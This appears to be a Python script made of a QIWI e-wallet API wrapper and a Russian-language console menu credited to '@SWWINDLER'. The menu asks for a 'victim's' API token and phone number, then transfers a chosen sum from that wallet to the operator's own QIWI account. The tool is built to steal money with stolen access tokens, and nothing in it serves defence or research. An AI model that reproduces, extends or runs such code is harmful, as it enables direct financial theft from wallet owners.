import time
import requests

# You can read about params here https://developer.qiwi.com/ru/qiwi-wallet-personal/?python#payments 

class QiwiApi(object):
    def __init__(self, token, phone):
        """
        :type token: str
        :type phone: str
        :type delay: int

        :param token: QIWI API token
        :param phone: Your phone [required for pay() function]
        :param delay: Loop sleep time
        """
        self.r = requests.Session()
        self.r.headers['Accept'] = 'application/json'
        self.r.headers['authorization'] = 'Bearer ' + token
        self.phone = phone

    def get_all_profile_info(self):
        response = self.r.get('https://edge.qiwi.com/person-profile/v1/profile/current').json()
        return response

    def get_identifiaction_info(self):
        response = self.r.get(f'https://edge.qiwi.com/identification/v1/persons/{self.phone}/identification').json()
        return response


    def get_balance_info(self):
        response = self.r.get(f'https://edge.qiwi.com/funding-sources/v2/persons/{self.phone}/accounts').json()
        return response

    @property
    def _transaction_id(self):
        """
        Generates transaction id for pay() function.
        :return: UNIX time * 1000
        """

        return str(int(time.time() * 1000))

    def withdraw_money(self, account, amount, currency='643', comment=None, tp='Account', acc_id='643'):

        post_args = {
            "id": self._transaction_id,
            "sum": {
                "amount": amount,
                "currency": currency
            },
            "paymentMethod": {
                "type": tp,
                "accountId": acc_id
            },
            "fields": {
                "account": account
            }
        }
        if comment is not None:
            post_args['comment'] = comment

        response = self.r.post(
            url='https://edge.qiwi.com/sinap/api/v2/terms/99/payments',
            json=post_args
        )
        return response.json()
from SimpleQIWI import * 
import sys
from QiwiApiBy import QiwiApi
import webbrowser as wb


print("СКРИПТ: @DarkWeb!")
print("Версия: 0.1")
print("Сделанна: @SWWINDLER,Телеграмм @SWWINDLER")


# wb.open("https://t.me/APT69APT")

def check_balance():
    token=input('Введите токен: ')
    phone=input('Введите номер: ')

    api = QiwiApi(token=token, phone=phone)
    print(api.get_all_profile_info())

def withdraw_money():
    token_target=input('Введите токен жертвы: ')
    phone_target=input('Введите номер жертвы: ')

    recepient_phone=input("Введите номер киви куда отправлять деньги: ")
    amount_send = input("Введите сколько отправлять: ")

    comment_text = input("Введите комментарий: ")

    api = QiwiApi(token=token_target, phone=phone_target)
    print(api.get_all_profile_info())

    api.withdraw_money(account=recepient_phone, amount=int(amount_send), comment=comment_text)
    print(api.get_all_profile_info())


def main ():
    while True:
        print("1 - Проверить баланс!") 
        print("2 - Снять деньги по токену!") 

        question = int(input("Что вы хотите сделать: "))
        try:
            if question == 1:
                check_balance()
            elif question == 2:
                withdraw_money()
            else:
                main()
        except Exception:
            print("Упс!", sys.exc_info()[0], "случилась .\n Попробуй еще")
            main()
main()
